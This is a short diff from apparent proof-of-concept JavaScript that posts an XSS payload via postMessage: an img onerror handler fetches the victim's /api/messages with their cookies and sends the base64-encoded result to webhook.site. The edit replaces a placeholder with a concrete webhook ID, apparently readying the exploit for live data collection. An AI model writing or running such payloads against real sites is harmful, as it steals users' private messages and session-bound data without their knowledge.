@@ -11,7 +11,7 @@
       html: `<img src=x onerror="
         fetch('/api/messages', {credentials:'include'})
           .then(r=>r.text())
-          .then(d=>fetch('https://webhook.site/YOUR-ID-HERE?data='+btoa(d)))
+          .then(d=>fetch('https://webhook.site/e1a822ee-3b01-4417-aa61-3ec13bd0413?data='+btoa(d)))
       ">`
     }, '*');
   }, 3000);
